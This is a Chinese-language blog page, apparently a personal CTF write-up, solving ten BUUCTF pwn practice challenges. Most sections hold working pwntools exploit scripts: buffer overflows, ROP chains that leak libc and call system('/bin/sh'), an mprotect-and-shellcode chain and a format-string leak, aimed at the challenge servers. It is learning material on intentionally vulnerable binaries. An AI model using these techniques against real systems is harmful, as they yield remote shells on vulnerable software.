@@ -1,0 +1,267 @@
+
+<!DOCTYPE html>
+<html lang="Zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BUUCTF-PWN(一) - 汐白的学习档案</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xibai,"> 
+    <meta name="description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,最近更新： 2020-01-31 22:43
+test_your_ncpwnの签到
+rip入门溢出覆盖 RIP
+1234567from pwn import *io = process(&amp;#x27;,"> 
+    <meta name="author" content="Xibai"> 
+    <link rel="alternative" href="atom.xml" title="汐白的学习档案" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="BUUCTF-PWN(一) - 汐白的学习档案"/>
+    <meta name="twitter:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,最近更新： 2020-01-31 22:43
+test_your_ncpwnの签到
+rip入门溢出覆盖 RIP
+1234567from pwn import *io = process(&amp;#x27;,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="汐白的学习档案"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="BUUCTF-PWN(一) - 汐白的学习档案"/>
+    <meta property="og:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,最近更新： 2020-01-31 22:43
+test_your_ncpwnの签到
+rip入门溢出覆盖 RIP
+1234567from pwn import *io = process(&amp;#x27;,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">汐白的学习档案</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">BUUCTF-PWN(一)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">BUUCTF-PWN(一)</h1>
+        <div class="stuff">
+            <span>五月 03, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Writeup/" rel="tag">Writeup</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p><strong>最近更新：</strong> <em>2020-01-31 22:43</em></p>
+<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>pwnの签到</p>
+<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>入门溢出覆盖 RIP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>同上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fi = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26624</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fi.recvuntil(<span class="string">&#x27;WOW:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = fi.recv()[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(<span class="built_in">int</span>(flag_addr,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">fi.sendline(payload)</span><br><span class="line"></span><br><span class="line">fi.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>加了个简易路障，输入长度被限制不能直接溢出，但是程序会把‘I’替换为‘you’，计算一下就会知道，只要输入21个‘I’即可进行后续的溢出操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28810</span>)</span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">21</span> + <span class="string">&#x27;a&#x27;</span> + p32(<span class="number">0x8048f13</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>依旧是简单的额变量溢出覆盖，将<code>float</code>变量覆盖为相应的十六进制即可。这里可以直接百度 float 变量的数据是如何解析的，然后构造相应的二进制或十六进制数值即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29674</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>我丢！！！Ubuntu18坑死窝惹555<br>用了好几天时间换各种姿势尝试拿服务器shell，本地的kali明明可以一遍通QAQ。最后无奈搜了大佬的wp才知道Ubuntu18的堆栈对齐问题导致无法执行<code>system</code>函数，而且最后也不知道详细的底层机制原理是啥，只知道Ubuntu18的堆栈对齐很迷，这道题是32字节的对齐宽度，在payload前面加一个<code>ret</code>的地址即可完成对齐。<br>另外，中间尝试通过<code>gets</code>和<code>__isoc99_scanf</code>函数向bss段写入数据，但是无法写入(工具查看是有RW权限的)，疑惑，实在没找到原因，如果写入成功的话或许可以尝试<code>ret2csu</code>来执行<code>execve</code>，这应该不会受到栈对齐的影响.<br>(数次调试后发现，该程序bss段无法写入数据md，不过发现<code>one_gadget</code>可以用)</p>
+<p><strong>继续查资料依旧没有找到Ubuntu18栈对齐对函数能否成功执行的影响原理，只知道堆栈指针对齐一般是16字节或32字节的对齐，其会在某些情况下影响程序的正常执行，而这道题显然就遇到了这‘某些情况’</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/BUU/pwn/libc/ubuntu18/64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">encrypt = p64(elf.symbols[<span class="string">&#x27;encrypt&#x27;</span>])</span><br><span class="line">libc_start_main_addr = p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">libc_start_main = libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">puts = p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rdi_ret = p64(<span class="number">0x400c83</span>)</span><br><span class="line">binsh_64 = libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + rdi_ret + libc_start_main_addr + puts + encrypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26004</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\x0a\x0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tmp_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">base = tmp_addr - libc_start_main</span><br><span class="line">binsh_64 += base</span><br><span class="line">system += base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(<span class="number">0x4006b9</span>) + rdi_ret + p64(binsh_64) + p64(system) + encrypt</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>简单ROP，用<code>\x00</code>绕过<code>strncmp</code>检测，然后溢出复写第二个<code>read</code>读入长度为255.<br>利用write函数泄露got表中已经被用过的函数地址，计算基地址，本题直接给出so文件，直接计算<code>system</code>函数和<code>/bin/sh</code>的地址。这里system直接攻击成功。不再尝试其他姿势。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29623</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(write) + p32(main) + p32(<span class="number">1</span>) + p32(write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>() + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span> + <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>我吐了，emp无敌。这道题看源码发现和上面<code>ciscn_2019_c_1</code>一模一样，但是exp打了好几遍就是打不通，本地是可以通的。无奈搜别的大佬的wp看是不是又有什么奇怪的姿势，发现确实是和上一题的共用一个exp就可以。<br>这里看到大佬用的<code>libcsearcher</code>而非BUU直接给出的libc，就去试了下libcsearcher尝试是不是libc的问题，然后就神奇的通了。。。但这里不是吐血的地方！<br>最神奇和吐血的地方是，这个时候因为<strong>觉得BUU一般的pwn题应该就是用的直接给出的对应的libc才对</strong>就把后来加上的<code>libcsearcher</code>相关的代码<strong>全删了用之前没改的代码，这一次突然就通了</strong>！？？？吐血emmm</p>
+<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>这道题感觉远程的文件权限是不是没分配好，也可能是故意为之，毕竟题目里放了一堆函数，然后给一个假的后门。<br>这里get到知识点，<code>mprotect</code>函数修改内存权限，然后向其中写入shellcode进行调用getshell。</p>
+<p>利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./get_started_3dsctf_2016&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28183</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="第五空间2019决赛-PWN5"><a href="#第五空间2019决赛-PWN5" class="headerlink" title="[第五空间2019决赛] PWN5"></a>[第五空间2019决赛] PWN5</h2><p>我与bug，同生共死！！！<br>这道题就是非常简单的格式化输出题目，<code>%s</code>or<code>%n</code>都可以秒，不过用<code>%s</code>会有玄学失败bug（ps：至少我会有玄学失败bug，如果未来有刷buu的萌新看到这里不用疑惑，先做再说，不过估计也没人会看到嘿嘿嘿）<br>题目本身很简单，读取了四字节随机数，然后输入一个整数和随机数比较，一样就直接shell。读取随机数的操作在输入buf之前，也就是可以利用格式化输出的漏洞修改或者直接输出随机数内容。然后直接输入一直数值获取shell。</p>
+<p>这个脚本是用<code>%s</code>读取随机数的内容然后直接输入。运行的时候概率性fail（吐血）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28350</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + <span class="string">&#x27;%10$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">6</span>))</span><br><span class="line">tmp = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">p.sendline(<span class="built_in">str</span>(tmp))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="5cd24ed310c0cbc2a2ed"
+        data-cs="51aa998e509794b7b061784f1f3d41018af118f6"
+        data-r="xikong-mubai.github.io"
+        data-o="xikong-mubai"
+        data-a="xikong-mubai"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">2.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">3.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">5.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek2019-babyrop"><span class="toc-number">7.</span> <span class="toc-text">[OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">8.</span> <span class="toc-text">ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started-3dsctf-2016"><span class="toc-number">9.</span> <span class="toc-text">get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">10.</span> <span class="toc-text">[第五空间2019决赛] PWN5</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+<!--血小板代码-->
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<div id="landlord">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://calmcenter.club/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
+</script>
+<!--血小板代码-->
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+</html>
